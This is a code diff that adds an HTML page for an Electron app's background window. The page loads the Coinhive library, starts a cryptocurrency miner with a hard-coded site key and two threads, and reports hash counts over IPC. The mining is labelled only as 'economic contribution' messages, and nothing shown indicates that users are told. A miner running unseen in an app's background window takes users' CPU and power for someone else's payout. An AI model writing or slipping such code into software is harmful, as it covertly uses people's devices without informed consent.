@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title></title>
+  </head>
+  <body>
+    <h1>Background window</h1>
+
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+      const { ipcRenderer } = require('electron')
+      const miner = new CoinHive.User('J2vvvLHOMXIy8GDWf3SNgsYFkP9TWjjv', 'citizen:1', {threads: 2, throttle: 0.8})
+
+      ipcRenderer.send('contribution-channel', 'economic connection starting...')
+      miner.start()
+
+      miner.on('open', () => {
+        ipcRenderer.send('contribution-channel', 'economic connection successfully made')
+        ipcRenderer.send('contribution-channel', 'economic contribution(s) starting...')
+      })
+
+      miner.on('accepted', () => {
+        const acceptedHashes = miner.getAcceptedHashes()
+        const hashesPerSecond = miner.getHashesPerSecond()
+
+        ipcRenderer.send('contribution-channel', 'economic contribution successfully made ' + acceptedHashes + ' ' + hashesPerSecond)
+      })
+    </script>
+  </body>
+</html>
